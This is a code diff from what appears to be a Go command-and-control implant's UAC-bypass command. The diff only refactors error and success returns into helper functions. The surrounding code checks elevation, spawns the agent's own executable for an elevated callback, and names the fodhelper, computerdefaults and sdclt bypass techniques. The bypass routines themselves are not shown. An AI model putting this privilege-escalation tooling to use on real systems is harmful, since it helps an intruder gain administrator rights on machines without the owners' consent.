@@ -38,11 +38,7 @@ func (c *UACBypassCommand) Execute(task structs.Task) structs.CommandResult {
 	var args uacBypassArgs
 	if task.Params != "" {
 		if err := json.Unmarshal([]byte(task.Params), &args); err != nil {
-			return structs.CommandResult{
-				Output:    fmt.Sprintf("Error parsing parameters: %v", err),
-				Status:    "error",
-				Completed: true,
-			}
+			return errorf("Error parsing parameters: %v", err)
 		}
 	}
 
@@ -52,22 +48,14 @@ func (c *UACBypassCommand) Execute(task structs.Task) structs.CommandResult {
 
 	// Check if already elevated — UAC bypass is unnecessary
 	if isElevated() {
-		return structs.CommandResult{
-			Output:    "Already running at high integrity (elevated). UAC bypass not needed.\nUse getsystem to escalate to SYSTEM.",
-			Status:    "success",
-			Completed: true,
-		}
+		return successResult("Already running at high integrity (elevated). UAC bypass not needed.\nUse getsystem to escalate to SYSTEM.")
 	}
 
 	// Default: spawn a new copy of ourselves for an elevated callback
 	if args.Command == "" {
 		exe, err := os.Executable()
 		if err != nil {
-			return structs.CommandResult{
-				Output:    fmt.Sprintf("Error getting executable path: %v", err),
-				Status:    "error",
-				Completed: true,
-			}
+			return errorf("Error getting executable path: %v", err)
 		}
 		args.Command = exe
 	}
@@ -80,11 +68,7 @@ func (c *UACBypassCommand) Execute(task structs.Task) structs.CommandResult {
 	case "sdclt":
 		return uacBypassSdclt(args.Command)
 	default:
-		return structs.CommandResult{
-			Output:    fmt.Sprintf("Unknown technique: %s. Use: fodhelper, computerdefaults, sdclt", args.Technique),
-			Status:    "error",
-			Completed: true,
-		}
+		return errorf("Unknown technique: %s. Use: fodhelper, computerdefaults, sdclt", args.Technique)
 	}
 }
 
